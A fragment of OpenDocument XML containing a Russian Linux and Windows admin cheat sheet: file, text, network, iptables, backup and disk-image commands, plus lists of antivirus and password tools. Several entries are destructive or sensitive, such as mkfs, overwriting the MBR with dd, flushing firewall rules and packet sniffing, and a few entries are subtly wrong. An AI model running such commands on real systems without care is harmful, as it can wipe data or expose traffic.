      <text:p text:style-name="P1"># cat file1 - Вывести все содержимое файла начиная с первой строки</text:p>
      <text:p text:style-name="P1"># head -2 file1 - Отобразить две первые строки файла</text:p>
      <text:p text:style-name="P1"># tac file1 - Отобразить содержимое файла начиная с последней строки</text:p>
      <text:p text:style-name="P1"># tail -f /var/log/messages - В реальном времени выводить все, что добавляется в файл</text:p>
      <text:p text:style-name="P1"># tail -2 file1 - Вывести две последние строки файла</text:p>
      <text:p text:style-name="P13"># more file1 - Отобразить содержимое файла постранично</text:p>
      <text:p text:style-name="P13"># less file1 - Аналогична команде more но позволяет перемещаться по содержимому вперед и назад</text:p>
      <text:p text:style-name="P1">Полезные команды Linux. Анализ файловой системы</text:p>
      <text:p text:style-name="P1"># badblocks -v /dev/hda1 - Проверить раздел hda1 на наличие bad-блоков</text:p>
      <text:p text:style-name="P1"># fsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность linux-файловой системы раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.ext2 /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext2 раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.msdos /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.vfat /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat раздела hda1</text:p>
      <text:p text:style-name="P1"># fsck.ext3 /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext3 раздела hda1</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># dosfsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы fat, раздела hda1</text:span></text:p>
      <text:p text:style-name="P1"># e2fsck /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext2 раздела hda1</text:p>
      <text:p text:style-name="P7"># e2fsck -j /dev/hda1 - Проверить и при необходимости попробовать восстановить целостность файловой системы ext3 раздела hda1, журнал файловой системы расположен там же</text:p>
      <text:p text:style-name="P1">Манипуляции с текстом</text:p>
      <text:p text:style-name="P1"># cat -n file1 - Вывести содержимое файла, нумеруя выводимые строки</text:p>
      <text:p text:style-name="P1"># cat example.txt | awk 'NR%2==1' - Вывести только не четные строки файла</text:p>
      <text:p text:style-name="P1"># echo a b c | awk '{print $1,$3}' - Вывести первую и третью колонки. Разделение, по-умолчанию, по пробельным символам или символу табуляции</text:p>
      <text:p text:style-name="P1"># echo a b c | awk '{print $1}' - Вывести первую колонку содержимого файла. Разделение, по-умолчанию, по пробельным символам или символу табуляции</text:p>
      <text:p text:style-name="P1"># comm -3 file1 file2 - Сравнить содержимое двух файлов, удаляя строки встречающиеся в обоих файлах</text:p>
      <text:p text:style-name="P1"># comm -1 file1 file2 - Сравнить содержимое двух файлов, не отображая строки принадлежащие файлу file1</text:p>
      <text:p text:style-name="P1"># comm -2 file1 file2 - Сравнить содержимое двух файлов, не отображая строки принадлежащие файлу file2</text:p>
      <text:p text:style-name="P1"># grep [0-9] /var/log/messages - Отобрать и вывести строки содержащие цифровые символы из файла /var/log/messages</text:p>
      <text:p text:style-name="P1"># grep ^Aug /var/log/messages - Отобрать и вывести строки, начинающиеся с сочетания символов "Aug", из файла /var/log/messages</text:p>
      <text:p text:style-name="P1"># grep Aug /var/log/messages - Отобрать и вывести строки, содержащие сочетание символов "Aug" из файла /var/log/messages</text:p>
      <text:p text:style-name="P1"># grep Aug -R /var/log/* - Отобрать и вывести строки, содержащие сочетание символов "Aug", из всех файлов, расположенных в директории /var/log и ниже</text:p>
      <text:p text:style-name="P13"># paste -d '+' file1 file2 - Объединить содержимое file1 и file2 в виде таблицы с разделителем "+"</text:p>
      <text:p text:style-name="P13"># paste file1 file2 - Объединить содержимое file1 и file2 в виде таблицы: строка 1 из file1 = строка 1 колонка 1-n, строка 1 из file2 = строка 1 колонка n+1-m</text:p>
      <text:p text:style-name="P1"># sdiff file1 file2 - Сравнить содержимое двух файлов</text:p>
      <text:p text:style-name="P1"># sed 's/string1/string2/g' example.txt - Заменить string1 на string2 в файле example.txt и вывести содержимое</text:p>
      <text:p text:style-name="P1"># sed '/ *#/d; /^$/d' example.txt - Удалить пустые строки и комментарии из файла example.txt</text:p>
      <text:p text:style-name="P1"># sed '/^$/d' example.txt - Удалить пустые строки и комментарии из файла example.txt</text:p>
      <text:p text:style-name="P1"># sed -e '1d' exampe.txt - Удалить первую строку из файла example.txt</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># sed -n '/string1/p' - Отобразить только строки содержащие string1</text:span></text:p>
      <text:p text:style-name="P1"># sed -e 's/string//g' example.txt - Удалить строку string1 из текста файла example.txt не изменяя всего остального</text:p>
      <text:p text:style-name="P1"># sed -e 's/ *$//' example.txt - Удалить пустые символы в конце каждой строки файла example.txt</text:p>
      <text:p text:style-name="P1"># sed -n '5p;5q' example.txt - Вывести пятую строку</text:p>
      <text:p text:style-name="P1"># sed -n '2,5p' example.txt - Вывести строки со второй по пятую</text:p>
      <text:p text:style-name="P1"># sed -e 's/00*/0/g' example.txt - Заменить последовательность из любого количества нулей одним нулём</text:p>
      <text:p text:style-name="P1"># sort file1 file2 - Вывести отсортированное содержимое двух файлов</text:p>
      <text:p text:style-name="P1"># sort file1 file2 | uniq - Вывести отсортированное содержимое двух файлов исключая повторные значения</text:p>
      <text:p text:style-name="P1"># sort file1 file2 | uniq -u - Вывести уникальные значения из отсортированного содержимого двух файлов</text:p>
      <text:p text:style-name="P1"># sort file1 file2 | uniq -d - Вывести только повторяющиеся значения из отсортированного содержимого двух файлов</text:p>
      <text:p text:style-name="P7"># echo 'word' | tr '[:lower:]' '[:upper:]' - Перевести символы нижнего регистра в верхний</text:p>
      <text:p text:style-name="P1">Сети (LAN / WiFi)</text:p>
      <text:p text:style-name="P1"># dhclient eth0 - Включить DHCP на сетевом интерфейсе eth0</text:p>
      <text:p text:style-name="P1"># ethtool eth0 - Вывод статистики по сетевому интерфейсу eth0</text:p>
      <text:p text:style-name="P1"># hostname - Вывести имя компьютера</text:p>
      <text:p text:style-name="P1"># host www.example.com - Преобразовать домен www.example.org в ip-адрес и наоборот</text:p>
      <text:p text:style-name="P1"># ifconfig eth0 - Вывести настройки сетевой карты eth0</text:p>
      <text:p text:style-name="P1"># ifconfig eth0 promisc - Переключить интерфейс eth0 в promiscuous-режим для сбора ( сниффинг ) сетевых пакетов</text:p>
      <text:p text:style-name="P1"># ifup eth0 - Включить сетевой интерфейс eth0</text:p>
      <text:p text:style-name="P1"># ifdown eth0 - Отключить сетевой интерфейс eth0</text:p>
      <text:p text:style-name="P1"># ifconfig eth0 192.168.1.1 netmask 255.255.255.0 - Назначить IP адрес и маску сетевому интерфейсу eth0</text:p>
      <text:p text:style-name="P1"># ip link show - Вывести статус связи всех сетевых интерфейсов</text:p>
      <text:p text:style-name="P13"># iwconfig eth1 - Вывести конфигурацию беспроводного сетевого интерфейса eth1</text:p>
      <text:p text:style-name="P13"># iwlist scan - Сканирование и поиск беспроводных сетей и точек доступа</text:p>
      <text:p text:style-name="P1"># mii-tool eth0 - Вывести состояние связи сетевого интерфейса eth0</text:p>
      <text:p text:style-name="P1"># nslookup www.example.com - Ресольвить ( преобразовать/разрешить ) доменное имя www.example.org в ip-адрес и наоборот</text:p>
      <text:p text:style-name="P1"># route -n - Песать локальной таблицы маршрутизации</text:p>
      <text:p text:style-name="P1"># route add -net 192.168.0.0 netmask 255.255.0.0 gw 192.168.1.1 - Добавить статический маршрут в сеть 192.168.0.0/16 через шлюз с ip-адресом 192.168.1.1</text:p>
      <text:p text:style-name="P1"># route add -net 0/0 gw IP_Gateway - Назначить ip-адрес шлюза по умолчанию ( default gateway )</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># route del 0/0 gw IP_gateway - Удалить ip-адрес шлюза по умолчанию ( default gateway )</text:span></text:p>
      <text:p text:style-name="P1"># netstat -tup - Выводит листинг всех установленных соединений по протоколам TCP и UDP без разрешения имён в ip-адреса а так-же PID'ы и имена процессов, обслуживающих данные соединения</text:p>
      <text:p text:style-name="P1"># netstat -tupl - Вывод списка соединений по протоколам TCP и UDP без разрешения имён в ip-адреса а так-же и PID'ы и имена процессов, ожидающих соединений на сетевых портах</text:p>
      <text:p text:style-name="P1"># netstat -rn - Вывести таблицу маршрутизации, аналог команды route -n</text:p>
      <text:p text:style-name="P1"># echo "1" &gt; /proc/sys/net/ipv4/ip_forward - Разрешить форвардинг ( пересылку ) пакетов</text:p>
      <text:p text:style-name="P1"># tcpdump tcp port 80 - Отлавливать и выводить весь трафик на TCP-порт 80 (обычно - HTTP)</text:p>
      <text:p text:style-name="P7"># whois www.example.com - Вывести информацию о доменном имени из базы данных whois</text:p>
      <text:p text:style-name="P1">Как блокировать USB-накопители в Windows?</text:p>
      <text:p text:style-name="P1">Если вам требуется, чтобы к компьютеру никто не мог подключить USB-накопители, вы можете запретить использование флешек, карт памяти и жестких дисков используя встроенные средства системы. Мышки, клавиатуры и другая периферия, не являющаяся хранилищем, продолжат свою работу.</text:p>
      <text:p text:style-name="P1">Для этого воспользуйтесь редактором локальной групповой политики:</text:p>
      <text:p text:style-name="P1">1. Нажмите «Win+R» и в поле введите команду «gpedit.msc», чтобы запустить редактор.</text:p>
      <text:p text:style-name="P1">2. Если требуется запретить использование USB накопителей для всех пользователей компьютера, перейдите к разделу «Конфигурация компьютера». Если требуется заблокировать доступ только для текущего пользователя, выберите «Конфигурация пользователя».</text:p>
      <text:p text:style-name="P1">3. В выбранном разделе откройте «Административные шаблоны» → «Система» → «Доступ к съемным запоминающим устройствам».</text:p>
      <text:p text:style-name="P1">4. Откройте параметр «Съемные запоминающиеся устройства всех классов: Запретить любой доступ» и установите значение «Включено» и тапните «Применить».</text:p>
      <text:p text:style-name="P16">На этом процесс будет завершен, а доступ к USB заблокирован. Перезагрузка компьютера не требуется, однако, если на момент включения ограничений накопитель уже был подключен, изменения для него вступят в силу только после отключения и повторного подключения.</text:p>
      <text:p text:style-name="P13">Резервное копирование</text:p>
      <text:p text:style-name="P1"># find /var/log -name '*.log' | tar cv --files-from=- | bzip2 &gt; log.tar.bz2 - Поиск всех файлов, заканчивающихся на ".log" в директории /var/log, и упаковка их в bzip-архив</text:p>
      <text:p text:style-name="P1"># find /home/user -name '*.txt' | xargs cp -av --target-directory=/home/backup/ --parents - Поиск в директории /home/user файлов, имена которых оканчиваются на ".txt", и копирование их в другую директорию</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3"># rsync -rogpav --delete /home /tmp - Синхронизировать директории /tmp и /home</text:span></text:p>
      <text:p text:style-name="P1"># rsync -az -e ssh --delete ip_addr:/home/public /home/local - Синхронизировать локальную и удаленную директории через ssh туннель используя сжатие</text:p>
      <text:p text:style-name="P1"># rsync -rogpav -e ssh --delete /home ip_address:/tmp - Синхронизация через SSH туннель</text:p>
      <text:p text:style-name="P1"># rsync -az -e ssh --delete /home/local ip_addr:/home/public - Синхронизировать удалённую директорию с локальной используя ssh туннель со сжатием</text:p>
      <text:p text:style-name="P1"># dd bs=1M if=/dev/hda | gzip | ssh user@ip_addr 'dd of=hda.gz' - Создать "слепок" локального диска в файл на удалённом сервере используя ssh туннель</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># dd if=/dev/hda of=/dev/fd0 bs=512 count=1 - </text:span><text:span text:style-name="T3">Создание</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">копии</text:span><text:span text:style-name="T2"> MBR ( Master Boot Record ) </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> /dev/hda </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">флоппи</text:span><text:span text:style-name="T2">-</text:span><text:span text:style-name="T3">диск</text:span></text:p>
      <text:p text:style-name="P1"># dd if=/dev/sda of=/tmp/backup - Создание резервной копии содержимого жесткого диска в файл backup</text:p>
      <text:p text:style-name="P1"># dd if=/dev/fd0 of=/dev/hda bs=512 count=1 - Восстановить MBR с флоппи-диска на /dev/hda</text:p>
      <text:p text:style-name="P1"># dump -0aj -f /tmp/home0.bak /home - Создать полную резервную копию директории /home в файл /tmp/home0.bak</text:p>
      <text:p text:style-name="P1"># dump -1aj -f /tmp/home0.bak /home - Создать инкрементную резервную копию директории /home в файл /tmp/home0.bak</text:p>
      <text:p text:style-name="P1"># restore -if /tmp/home0.bak - Восстановить данные из резервной копии /tmp/home0.bak</text:p>
      <text:p text:style-name="P1"># tar -Puf backup.tar /home/user - Создать инкрементную резервную копию директории /home/user в файл backup.tar сохраняя права доступа</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># ( cd /tmp/local/ &amp;&amp; tar c . ) | ssh -C user@ip_addr 'cd /home/shar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tmp/local </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директорию</text:span><text:span text:style-name="T2"> /home/shar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2" loext:marker-style-name="T1"><text:span text:style-name="T2"># ( tar c /home ) | ssh -C user@ip_addr 'cd /home/backup-hom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home </text:span><text:span text:style-name="T3">в</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">директорию</text:span><text:span text:style-name="T2"> /home/backup-hom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7"># tar cf - . | (cd /tmp/backup ; tar xf - ) - Упаковка в архив и копирование одной директории в другую с сохранением прав доступа и ссылок</text:p>
      <text:p text:style-name="P1">Форматирование файловой системы</text:p>
      <text:p text:style-name="P1"># fdformat -n /dev/fd0 - Форматирование флоппи-диска без проверки</text:p>
      <text:p text:style-name="P1"># mkfs /dev/hda1 - Создать файловую систему linux на разделе hda1</text:p>
      <text:p text:style-name="P1"># mke2fs -j /dev/hda1 - Создать журналируемую файловую систему ext3 на разделе hda1</text:p>
      <text:p text:style-name="P1"># mke2fs /dev/hda1 - Создание файловой системы ext2 на разделе hda1</text:p>
      <text:p text:style-name="P7"># mkfs -t vfat 32 -F /dev/hda1 - Создать файловую систему FAT32 на разделе hda</text:p>
      <text:p text:style-name="P17">Файловая система SWAP</text:p>
      <text:p text:style-name="P1"># mkswap /dev/hda3 - Создание swap-пространство на разделе hda3</text:p>
      <text:p text:style-name="P1"># swapon /dev/hda3 - Включить swap-пространство, расположенное на разделе hda3</text:p>
      <text:p text:style-name="P7"># swapon /dev/hda2 /dev/hdb3 - Активировать swap-пространства, расположенные на разделах hda2 и hdb3</text:p>
      <text:p text:style-name="P1">Конвертирование содержимого текстовых файлов</text:p>
      <text:p text:style-name="P1"># dos2unix filedos.txt fileunix.txt - Конвертировать содержимое текстового файла из MSDOS кодировки в UNIX кодировку (разница в символах возврата коретки)</text:p>
      <text:p text:style-name="P1"># unix2dos fileunix.txt filedos.txt - Конвертировать содержимое текстового файла из UNIX кодировки в MSDOS кодировку (разница в символах возврата коретки)</text:p>
      <text:p text:style-name="P1"># recode ..HTML &lt; page.txt &gt; page.html - Конвертировать содержимое тестового файла page.txt в html-файл page.html</text:p>
      <text:p text:style-name="P7"># recode -l | more - Вывести список доступных форматов</text:p>
      <text:p text:style-name="P1">Microsoft Windows networks (samba)</text:p>
      <text:p text:style-name="P1"># mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share - Монтировать smb-ресурс, расшаренный на windows-машине, в папку локальной файловой системы</text:p>
      <text:p text:style-name="P1"># nbtscan ip_addr - Преобразовать имя netbios. Программа nbtscan не во всех системах присутствует по-умолчанию, nmblookup включен в пакет samba</text:p>
      <text:p text:style-name="P1"># nmblookup -A ip_addr - Преобразовать имя netbios. Программа nbtscan не во всех системах присутствует по-умолчанию, nmblookup включен в пакет samba</text:p>
      <text:p text:style-name="P1"># smbclient -L ip_addr/hostname - Вывести список ресурсов, выделенных в общий доступ на windows-машине</text:p>
      <text:p text:style-name="P7"># smbget -Rr smb://ip_addr/share - Аналог программы wget для SMB протокола</text:p>
      <text:p text:style-name="P1">Фаервол IPTABLES, штатный, для большинства дистрибутивов Linux</text:p>
      <text:p text:style-name="P1"># iptables -t filter -L - Вывести список всец цепочек правил</text:p>
      <text:p text:style-name="P1"># iptables -t nat -L - Вывести все цепочки из NAT таблицы</text:p>
      <text:p text:style-name="P1"># iptables -t nat -F - Очистить все цепочки правил в таблице NAT</text:p>
      <text:p text:style-name="P1"># iptables -t filter -X - Очистить все пользовательские цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P1"># iptables -t filter -F - Очистить все цепочки правил в таблице filter</text:p>
      <text:p text:style-name="P1"># iptables -t filter -A INPUT -p tcp --dport telnet -j ACCEPT - Разрешить входящие соединения с telnet</text:p>
      <text:p text:style-name="P1"># iptables -t filter -A OUTPUT -p tcp --dport http -j DROP - Запретить исходящие HTTP соединения</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2"># iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE - </text:span><text:span text:style-name="T3">включить</text:span><text:span text:style-name="T2"> NAT (Network Address Translate) </text:span><text:span text:style-name="T3">исходящих</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">интерфейс</text:span><text:span text:style-name="T2"> eth0. </text:span><text:span text:style-name="T3">Допустимо</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">при</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">использовании</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">с</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">динамически</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">выделяемыми</text:span><text:span text:style-name="T2"> ip-</text:span><text:span text:style-name="T3">адресами</text:span><text:span text:style-name="T2">.</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># iptables -t nat -A PREROUTING -d 192.168.0.1 -p tcp -m tcp --dport 22 -j DNAT --to-destination 10.0.0.2:22 - </text:span><text:span text:style-name="T3">Пересылка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">адресованных</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">одному</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">хосту</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">другой</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">хост</text:span></text:p>
      <text:p text:style-name="P14" loext:marker-style-name="T1"><text:span text:style-name="T2"># iptables -t filter -A INPUT -j LOG --log-prefix - </text:span><text:span text:style-name="T3">Включить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">логгирование</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">пакетов</text:span><text:span text:style-name="T2">, </text:span><text:span text:style-name="T3">проходящих</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">через</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">цепочку</text:span><text:span text:style-name="T2"> INPUT, </text:span><text:span text:style-name="T3">и</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">добавлением</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">к</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">сообщению</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">префикса</text:span><text:span text:style-name="T2"> "DROP INPUT"</text:span></text:p>
      <text:p text:style-name="P11" loext:marker-style-name="T1"><text:span text:style-name="T2"># iptables -t filter -A FORWARD -p tcp --dport pop3 -j ACCEPT - </text:span><text:span text:style-name="T3">Разрешить</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">форвардинг</text:span><text:span text:style-name="T2"> POP3 </text:span><text:span text:style-name="T3">соединений</text:span></text:p>
      <text:p text:style-name="P1">Мониторинг и отладка системы</text:p>
      <text:p text:style-name="P1"># free -m - Вывод статистики по оперативной памяти</text:p>
      <text:p text:style-name="P1"># kill -9 proc_id - Убить процесс с PID proc_id, без соблюдения целостности данных, то есть насмерть</text:p>
      <text:p text:style-name="P1"># kill -1 proc_id - Перечитать файл конфигурации процессом с PID proc_id</text:p>
      <text:p text:style-name="P1"># last reboot - Вывод истории ребутов системы</text:p>
      <text:p text:style-name="P1"># lsof /home/user1 - Вывести список открытых файлов из директории /home/user1</text:p>
      <text:p text:style-name="P1"># lsof -p proc_id - Вывести список файлов, открытых процессом с PID proc_id</text:p>
      <text:p text:style-name="P1"># lsmod - Список загруженных модулей ядра</text:p>
      <text:p text:style-name="P1"># ps -e -o pid,args --forest - Вывести список PID'ов и процессов в виде дерева</text:p>
      <text:p text:style-name="P1"># ps -eafw - Отобразить работающие в системе процессы, используемые ими ресурсы и другую полезную информацию ( единожды )</text:p>
      <text:p text:style-name="P1"># pstree - Вывести дерево процессов</text:p>
      <text:p text:style-name="P1"># smartctl -i /dev/hda - Проверить доступность SMART на жёстком диске /dev/hda</text:p>
      <text:p text:style-name="P1"># smartctl -A /dev/hda - Проверка состояния жёсткого диска /dev/hda через SMART</text:p>
      <text:p text:style-name="P1"># strace -c ls &gt;/dev/null - Вывести список системных вызовов, созданных и полученных процессом ls</text:p>
      <text:p text:style-name="P1"># strace -f -e open ls &gt;/dev/null - Вывести список вызовов системных бибилотек</text:p>
      <text:p text:style-name="P1"># tail /var/log/messages - Вывести десять последних записей из системного журнала</text:p>
      <text:p text:style-name="P1"># tail /var/log/dmesg - Вывести десять последних записей из журнала загрузки ядра</text:p>
      <text:p text:style-name="P1"># top - Вывести список работающих в системе процессов с различной полезной информацией в режиме реального времени с автоматическим обновлением данных</text:p>
      <text:p text:style-name="P1"># watch -n1 'cat /proc/interrupts' - Выводить прерывания в режиме реального времени</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">Другие полезные команды</text:span></text:p>
      <text:p text:style-name="P1"># alias hh='history' - Создать псевдоним hh для команды history</text:p>
      <text:p text:style-name="P1"># apropos ...keyword - Вывод комманд, так или иначе относящихся к ключевым словам. Полезно, когда вы знаете что делает программа, но не помните команду</text:p>
      <text:p text:style-name="P1"># chsh - Изменить системную оболочку пользователя</text:p>
      <text:p text:style-name="P1"># gpg -c file1 - Шифрует файл file1 с помощью GNU Privacy Guard</text:p>
      <text:p text:style-name="P1"># gpg file1.gpg - Дешифрует файл file1 с помощью GNU Privacy Guard</text:p>
      <text:p text:style-name="P1"># ldd /usr/bin/ssh - Список библиотек, используемых программой ssh</text:p>
      <text:p text:style-name="P1"># man ping - Ввывод страниц руководства по работе с программой, в данном случае, ping</text:p>
      <text:p text:style-name="P1"># mkbootdisk --device /dev/fd0 `uname -r` - Создаёт загрузочный флоппи-диск</text:p>
      <text:p text:style-name="P14"><text:span text:style-name="T3"># wget -r www.example.com - Рекурсивно загружает содержимое сайта </text:span><text:a xlink:type="simple" xlink:href="http://www.example.com/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T4">www.example.com</text:span></text:a></text:p>
      <text:p text:style-name="P13"># wget -c www.example.com/file.iso - Загрузить файл www.example.com/file.iso с возможностью остановки и докачки</text:p>
      <text:p text:style-name="P1"># echo 'wget -c www.example.com/files.iso' | at 09:00 - Включить закачку в определенное время</text:p>
      <text:p text:style-name="P1"># whatis ...keyword - Вывести описание действий указанной программы</text:p>
      <text:p text:style-name="P7"># who -a - Вывести список залогиненных пользователей, время последней загрузки системы и прочую полезную информацию</text:p>
      <text:p text:style-name="P7">Что такое inode в Linux? Индексный дескриптор в файловой системе, который хранит метаданные о файлах, за исключением имени файла. В дескрипторе хранится: длина файла в байтах, id устройства с файлом, id пользователя владельца файла, id группы файла, режим файла (права доступа), timestamp последнего изменения файла, счётчик хардлинков, указатели на блоки файла.</text:p>
      <text:p text:style-name="P1">Как преобразовать Linux dd образ img в .VDI, VMDK, VHD с помощью команды VIrtualBox. Конвертация IMG файлов в формат VDI, VMDK, VHD для Oracle VirtualBox, Vmware и XenCenter.</text:p>
      <text:p text:style-name="P1">Сначала нам нужно взять образ из системы Linux, и это займет некоторое время.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">dd if=/dev/sda of=/mnt/run/media/filename.img bs=4M</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">1. Откройте окно cmd.</text:p>
      <text:p text:style-name="P1">Нажмите Выполнить -&gt; cmd -&gt; Enter</text:p>
      <text:p text:style-name="P1">2. Обратите внимание, что Windows открывает окно DOS.</text:p>
      <text:p text:style-name="P1">Затем перейдите к dd image drive.</text:p>
      <text:p text:style-name="P1">3. Для этой работы необходимо установить Oracle Virtual box.</text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для</text:span><text:span text:style-name="T2"> Virtual Box:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">I:\&gt;VBoxManage convertfromraw --format VDI sourcefile.dd filename.VDI</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для</text:span><text:span text:style-name="T2"> Vmware ESXi:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:soft-page-break/><text:span text:style-name="T2">I:\&gt;VBoxManage convertfromraw --format VMDK sourcefile.dd filename.VMDK</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">Для</text:span><text:span text:style-name="T2"> Hyper-V:</text:span></text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">I:\&gt;VBoxManage convertfromraw --format VHD sourcefile.dd filename.VHD</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P1">Нажмите Enter, чтобы начать преобразование.</text:p>
      <text:p text:style-name="P1">Подождите около полутора минут, пока конвертирование будет происходить, а затем создайте новую виртуальную машину с файлом VDI.</text:p>
      <text:p text:style-name="P1">Как преобразовать образ диска гостевой виртуальной машины VirtualBox из VMDK в VDI</text:p>
      <text:p text:style-name="P1">Администратор VirtualBox хочет перенести формат образа диска существующей импортированной гостевой ВМ из VMDK в собственный формат файлов VirtualBox, например VDI.</text:p>
      <text:p text:style-name="P1">VirtualBox обеспечивает поддержку преобразования файлов образов дисков с помощью команды “VBoxManage clonemedium”.</text:p>
      <text:p text:style-name="P1">Как всегда, административной “лучшей практикой” считается сохранение критически важных компонентов в архиве резервных копий перед выполнением инвазивных административных действий такого рода.</text:p>
      <text:p text:style-name="P1">Пример синтаксиса команды для этой операции в VirtualBox 6.0:</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2"># VBoxManage clonemedium disk [inputfile] [outputfile] --format VDI</text:span><text:span text:style-name="T2"/></text:p>
      <text:p text:style-name="P16">Примечание: более ранние версии VirtualBox предоставляли аналогичную функциональность с помощью команд clonevdi и clonehd.</text:p>
      <text:p text:style-name="P13">Вместо 1000 антивирусов</text:p>
      <text:p text:style-name="P1">1.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p>
      <text:p text:style-name="P1">2. Virus Total (https://www.virustotal.com/gui/home/upload) - <text:s/>самый популярный онлайн антивирус. Проверяет файлы и ссылки. Имеет своего бота здесь (https://t.me/VirusTotalAV_bot), однако внутри можно увидеть много стрёмной рекламы. </text:p>
      <text:p text:style-name="P1">3.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 </text:p>
      <text:p text:style-name="P1">4. MetaDefender Cloud - мощный антивирусный сканер файлов, ссылок, IP адресов, доменов и хешей. </text:p>
      <text:p text:style-name="P7">5. ClamAV - пакет антивирусного ПО, работающий во многих операционных системах, включая Unix-подобные ОС, OpenVMS, Microsoft Windows и Apple Mac OS X.</text:p>
      <text:p text:style-name="P1">Подборка сервисов для шифрования, хеширования и расшифровки данных онлайн</text:p>
      <text:p text:style-name="P2"><text:soft-page-break/><text:span text:style-name="T3">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span></text:p>
      <text:p text:style-name="P2"><text:span text:style-name="T3">2. http://crypt-online.ru/ - поддерживаемые алго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1">3. https://planetcalc.ru/search/?tag=813 - поддерживает шифр Цезаря, Виженера, Хилла, Атбаш, A1Z26, Плейфера и шифр масонов. </text:p>
      <text:p text:style-name="P1">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1">Блокировка учетной записи пользователя: </text:p>
      <text:p text:style-name="P1">$ passwd -l user_name </text:p>
      <text:p text:style-name="P1">Проверка состояния учетной записи:</text:p>
      <text:p text:style-name="P1">$ passwd -S user_name</text:p>
      <text:p text:style-name="P1">Разблокировка пользователя: </text:p>
      <text:p text:style-name="P7">$ passwd -u user_name</text:p>
      <text:p text:style-name="P1">Все для ваших паролей</text:p>
      <text:p text:style-name="P1">1. Генераторы</text:p>
      <text:p text:style-name="P13">omgopass - сервис для создания надежных и легко запоминающихся паролей.</text:p>
      <text:p text:style-name="P13">Identiji <text:s/>- расширение для генерации паролей с помощью эмодзи. </text:p>
      <text:p text:style-name="P1">EasyStrongPassword (https://t.me/EasyStrongPasswordBot) - генератор сложных и простых паролей + мнемонических фраз.</text:p>
      <text:p text:style-name="P2" loext:marker-style-name="T1"><text:span text:style-name="T2">2. </text:span><text:span text:style-name="T3">Проверка</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">на</text:span><text:span text:style-name="T2"> </text:span><text:span text:style-name="T3">брут</text:span><text:span text:style-name="T2">/</text:span><text:span text:style-name="T3">слив</text:span></text:p>
